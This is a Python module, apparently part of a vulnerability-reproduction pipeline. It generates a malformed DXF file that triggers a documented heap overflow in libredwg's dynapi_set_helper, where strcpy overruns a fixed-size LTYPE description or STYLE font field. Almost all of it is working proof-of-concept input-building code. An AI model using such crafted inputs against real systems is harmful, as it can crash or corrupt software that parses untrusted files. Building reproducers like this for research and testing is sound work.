"""CG-35（arvo:49613 / libredwg）dynapi TFv 固定串溢出构造器。

**缺陷**：src/dynapi.c（由 src/gen-dynapi.pl 生成）dynapi_set_helper()，TFv 分支：

    else if (strEQc (f->type, "TFv"))
      {
        char *str = (char *)calloc (f->size, 1);
        strcpy (str, *(char**)value);          /* 第 3112 行，不封顶 */
        memcpy (old, &str, sizeof (char*));
      }

TFv 是"固定长度字符串"字段，缓冲只有 f->size 字节；值来自 DXF 的组码字符串，
strcpy 不封顶 → 堆写越界。patch 把 strcpy 换成 strncpy(str, value, f->size)。

libredwg 里 TFv 字段（src/dynapi.c）：
    STYLE.font_file 64 / STYLE.bigfont_file 64 / LTYPE.description 48
    HEADER: MENU 15 / DIMBLK_T 33 / DIMPOST 16 ...

**触发形**：DXF 文本里让某个 TFv 字段拿到 ≥ f->size 的字符串
（官方 WRITE of size 49 对应 LTYPE.description 的 48 字节缓冲）。
**输入**：/out/llvmfuzz 直接 dwg_read_dxf 解析 DXF 文本。
"""
from __future__ import annotations

FIELDS = {
    "kind": "'ltype'（默认，description @48）| 'style'（font_file @64）",
    "size": "int(16..512), 字符串长度（默认 200，远大于字段容量）",
    "where": "'tables'（默认，带 TABLE/ENDTAB 包装）| 'blocks'（直接放在 BLOCKS 段）",
    "acadver": "str, $ACADVER（默认 AC1015）",
}

TFV = {
    "ltype": {"obj": "LTYPE", "code": 3, "cap": 48},
    "style": {"obj": "STYLE", "code": 3, "cap": 64},
}

DECLARED_SINK = {
    "file": "src/dynapi.c",
    "line": 3112,
    "symbol": "dynapi_set_helper",
    "note": "TFv 分支 calloc(f->size) 后 strcpy 不封顶，DXF 字符串超过字段容量即堆写越界",
}


class DynapiResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "dynapi"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def _p(code, value):
    return "%d\n%s\n" % (code, value)


def build(fields: dict) -> DynapiResult:
    fields = dict(fields or {})
    kind = str(fields.get("kind") or "ltype")
    if kind not in TFV:
        return DynapiResult(False, reason="kind 只认 ltype/style: %s" % kind)
    try:
        size = int(fields.get("size", 200))
    except (TypeError, ValueError):
        return DynapiResult(False, reason="size 必须是整数")
    if not 16 <= size <= 512:
        return DynapiResult(False, reason="size 越界（16..512）: %d" % size)
    where = str(fields.get("where") or "tables")
    if where not in ("tables", "blocks"):
        return DynapiResult(False, reason="where 只认 tables/blocks: %s" % where)
    acadver = str(fields.get("acadver") or "AC1015")

    spec = TFV[kind]
    value = "A" * size
    if kind == "ltype":
        obj = (_p(0, "LTYPE") + _p(2, "CONTINUOUS") + _p(70, 0)
               + _p(spec["code"], value) + _p(72, 65) + _p(73, 0) + _p(40, 0.0))
    else:
        obj = (_p(0, "STYLE") + _p(2, "STANDARD") + _p(70, 0) + _p(40, 0.0)
               + _p(41, 1.0) + _p(50, 0.0) + _p(71, 0) + _p(42, 0.0)
               + _p(spec["code"], value))

    if where == "tables":
        body = _p(0, "TABLE") + _p(2, spec["obj"]) + _p(70, 1) + obj + _p(0, "ENDTAB")
    else:
        body = obj

    text = (_p(0, "SECTION") + _p(2, "HEADER") + _p(9, "$ACADVER") + _p(1, acadver)
            + _p(0, "ENDSEC")
            + _p(0, "SECTION") + _p(2, "TABLES" if where == "tables" else "BLOCKS")
            + body + _p(0, "ENDSEC") + _p(0, "EOF"))
    used = {"kind": kind, "obj": spec["obj"], "code": spec["code"],
            "field_cap": spec["cap"], "value_len": size, "where": where,
            "acadver": acadver, "bytes": len(text)}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "dynapi 构造器不识别该字段"}
               for k in fields if k not in known]
    return DynapiResult(True, text.encode(), used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：TFv 固定串被 strcpy 写穿。"""
    return {
        "claim_id": "cg35-libredwg-dynapi-tfv",
        "subject": "dynapi_set_helper",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/dynapi.py + arvo error.txt",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "dynapi"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    text = r.data.decode()
    assert text.startswith("0\nSECTION\n2\nHEADER\n9\n$ACADVER\n1\nAC1015\n")
    assert "3\n" + "A" * 200 in text
    assert r.fields_used["field_cap"] == 48
    assert build({"kind": "style", "size": 100}).fields_used["field_cap"] == 64
    assert build({"where": "blocks"}).ok
    assert not build({"kind": "nope"}).ok
    assert not build({"size": 8}).ok
    assert not build({"where": "nowhere"}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "dynapi_set_helper" and c["sink"]["line"] == 3112
    print("dynapi builder self-check OK:", r.to_record())
